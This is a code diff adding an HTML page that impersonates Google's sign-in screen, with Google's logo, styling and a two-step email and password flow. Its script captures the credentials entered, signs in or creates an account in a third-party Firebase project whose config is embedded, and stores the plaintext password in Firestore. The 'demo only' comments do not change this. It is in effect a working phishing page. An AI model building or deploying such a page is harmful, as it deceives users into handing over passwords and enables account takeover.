@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sign In</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: #f5f5f5;
+        }
+        .login-box {
+            width: 400px;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            background: white;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .logo {
+            width: 75px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            color: #202124;
+        }
+        .subtitle {
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        button:hover {
+            background: #1765cc;
+        }
+        .error {
+            color: #d93025;
+            font-size: 14px;
+            margin: -15px 0 15px;
+            text-align: left;
+            display: none;
+        }
+        .footer {
+            margin-top: 30px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+        a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .email-display {
+            font-weight: 500;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: #202124;
+        }
+        .change-email {
+            color: #1a73e8;
+            cursor: pointer;
+            font-weight: normal;
+        }
+        #password-stage {
+            display: none;
+        }
+        .forgot-password {
+            display: block;
+            text-align: left;
+            margin: -15px 0 20px;
+            color: #1a73e8;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to your account</p>
+        
+        <!-- Email Stage -->
+        <div id="email-stage">
+            <input type="email" id="email" placeholder="Email or phone" autofocus>
+            <div class="error" id="email-error">Enter a valid email or phone number</div>
+            <button type="button" id="next-btn" disabled>Next</button>
+            <div class="footer">
+                <a href="#" id="create-account">Create account</a>
+            </div>
+        </div>
+        
+        <!-- Password Stage -->
+        <div id="password-stage">
+            <div class="email-display">
+                <span id="password-email-display"></span>
+                <span class="change-email" id="password-change-email">Change</span>
+            </div>
+            <input type="password" id="password" placeholder="Enter your password" autofocus>
+            <div class="error" id="password-error">Enter your password</div>
+            <a href="#" class="forgot-password">Forgot password?</a>
+            <button type="button" id="signin-btn">Sign in</button>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { 
+            getAuth, 
+            signInWithEmailAndPassword,
+            createUserWithEmailAndPassword 
+        } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+        import { 
+            getFirestore, 
+            doc, 
+            setDoc,
+            getDoc
+        } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDgfqSEXwZNLpuNb4qYGrULTHrZ_SJMQI4",
+            authDomain: "channels-c8d13.firebaseapp.com",
+            projectId: "channels-c8d13",
+            storageBucket: "channels-c8d13.appspot.com",
+            messagingSenderId: "704343212635",
+            appId: "1:704343212635:web:ea14e6414c5137cace757e",
+            measurementId: "G-G5FQX9J4ER"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        // DOM elements
+        const emailInput = document.getElementById('email');
+        const emailError = document.getElementById('email-error');
+        const nextBtn = document.getElementById('next-btn');
+        const passwordStage = document.getElementById('password-stage');
+        const emailStage = document.getElementById('email-stage');
+        const passwordEmailDisplay = document.getElementById('password-email-display');
+        const passwordChangeEmail = document.getElementById('password-change-email');
+        const passwordInput = document.getElementById('password');
+        const passwordError = document.getElementById('password-error');
+        const signinBtn = document.getElementById('signin-btn');
+        const createAccountBtn = document.getElementById('create-account');
+
+        // Email validation
+        emailInput.addEventListener('input', function() {
+            const email = emailInput.value.trim();
+            const isValid = validateEmail(email);
+            
+            if (email.length === 0) {
+                nextBtn.disabled = true;
+                emailError.style.display = 'none';
+            } else if (isValid) {
+                nextBtn.disabled = false;
+                emailError.style.display = 'none';
+            } else {
+                nextBtn.disabled = true;
+                emailError.style.display = 'block';
+            }
+        });
+
+        // Next button click - shows password field
+        nextBtn.addEventListener('click', function() {
+            const email = emailInput.value.trim();
+            
+            if (validateEmail(email)) {
+                emailStage.style.display = 'none';
+                passwordStage.style.display = 'block';
+                passwordEmailDisplay.textContent = email;
+                passwordInput.focus();
+            } else {
+                emailError.style.display = 'block';
+            }
+        });
+
+        // Change email buttons
+        passwordChangeEmail.addEventListener('click', function() {
+            passwordStage.style.display = 'none';
+            emailStage.style.display = 'block';
+            emailInput.focus();
+        });
+
+        // Sign in button - creates user document with raw password
+        signinBtn.addEventListener('click', async function() {
+            const email = passwordEmailDisplay.textContent;
+            const password = passwordInput.value.trim();
+            
+            if (password.length === 0) {
+                passwordError.style.display = 'block';
+                passwordInput.focus();
+                return;
+            }
+            
+            passwordError.style.display = 'none';
+            
+            try {
+                // First try to sign in (in case user exists)
+                let userCredential;
+                try {
+                    userCredential = await signInWithEmailAndPassword(auth, email, password);
+                } catch (authError) {
+                    if (authError.code === 'auth/user-not-found') {
+                        // If user doesn't exist, create them
+                        userCredential = await createUserWithEmailAndPassword(auth, email, password);
+                    } else {
+                        throw authError;
+                    }
+                }
+                
+                const user = userCredential.user;
+                
+                // INSECURE: Store raw credentials in Firestore (FOR DEMO ONLY)
+                await setDoc(doc(db, 'users', user.uid), {
+                    email: email,
+                    password: password, // NEVER DO THIS IN PRODUCTION
+                    lastLogin: new Date(),
+                    provider: 'email/password'
+                }, { merge: true });
+                
+                alert("Authentication successful!\n\n" + 
+                      `Email: ${email}\n` +
+                      `Password: ${password}\n\n` +
+                      "This data has been stored in Firestore (INSECURE PRACTICE)");
+                
+                // window.location.href = 'welcome.html';
+            } catch (error) {
+                console.error("Authentication error:", error);
+                passwordError.textContent = getErrorMessage(error);
+                passwordError.style.display = 'block';
+            }
+        });
+
+        // Create account button
+        createAccountBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            emailStage.style.display = 'none';
+            passwordStage.style.display = 'block';
+            passwordEmailDisplay.textContent = 'newuser@example.com';
+            passwordInput.focus();
+        });
+
+        // Helper functions
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        function getErrorMessage(error) {
+            switch(error.code) {
+                case 'auth/wrong-password':
+                    return 'Wrong password. Try again.';
+                case 'auth/user-not-found':
+                    return 'User not found. Creating new account...';
+                case 'auth/too-many-requests':
+                    return 'Too many attempts. Try again later.';
+                default:
+                    return error.message;
+            }
+        }
+
+        // Enter key functionality
+        emailInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && !nextBtn.disabled) {
+                nextBtn.click();
+            }
+        });
+
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                signinBtn.click();
+            }
+        });
+    </script>
+</body>
+</html>
